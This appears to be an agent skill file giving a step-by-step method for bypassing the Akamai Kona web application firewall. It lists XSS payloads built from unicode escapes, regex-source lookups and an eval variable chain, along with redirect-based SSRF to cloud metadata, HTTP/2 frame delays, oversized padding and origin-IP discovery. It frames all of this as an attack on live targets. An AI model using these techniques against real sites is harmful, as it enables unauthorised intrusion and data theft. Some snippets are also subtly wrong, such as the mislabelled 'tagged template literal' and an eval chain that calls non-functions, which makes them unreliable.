---
name: waf-bypass-akamai
description: Skill for bypassing Akamai Kona WAF using variable chaining (CVE-2025-30143), JSON escape unicode normalization, tagged template literals, redirect-based SSRF, and origin IP discovery.
sources: github
---

# Akamai Kona WAF Bypass

## Crown Jewel Targets

- Endpoints behind Akamai Kona with default rule sets
- APIs where Akamai adaptive security engine is disabled
- Pages where `X-Akamai-*` headers indicate Kona presence
- Origin servers discoverable via Censys/Shodan

## Attack Surface Signals

- `X-Akamai-Transformed` or `X-Akamai-Request-ID` header
- `X-Akamai-Staging` header on staging environments
- Block page content: "Reference #..." or "AkamaiGHost"
- `Server: AkamaiGHost` response header

## Step-by-Step Methodology

1. Confirm Akamai presence: check for `X-Akamai-*` headers
2. Test basic XSS: `<script>alert(1)</script>` — expect block
3. Test JSON escape unicode: `\u003csvg onload=alert(1)\u003e`
4. Test tagged template literals: `window[/al/.source]` — bypasses signature matching
5. Test variable chaining (CVE-2025-30143): `a=alert;b=document;c=location;d=c.hash;eval(a(b(c(d))))` with URL encoding
6. Test redirect-based SSRF: Akamai only inspects first redirect URL
7. Test HTTP/2 frame delay: send headers, delay DATA frames
8. Test payload padding to exceed 8KB WAF buffer: pad payload to >8192 bytes
9. If all blocked, try origin IP discovery via Censys/Shodan/favicon hash

## Payloads

```html
\u003csvg onload=alert(1)\u003e
window[/al/.source](window[/doc/.source].domain)
a=alert;b=document;c=location;d=c.hash;eval(a(b(c(d))))
```

## Bypass Techniques

- Variable chaining: split malicious intent across multiple statements
- JSON unicode: `\uXXXX` encoding for HTML special chars
- Tagged template literals: `window[/al/.source]` rather than `window["alert"]`
- Redirect chaining: first redirect to safe URL, second to cloud metadata
- HTTP/2 frame splitting: send headers first, DATA frames later
- Buffer overflow: pad payload to exceed WAF body inspection limit
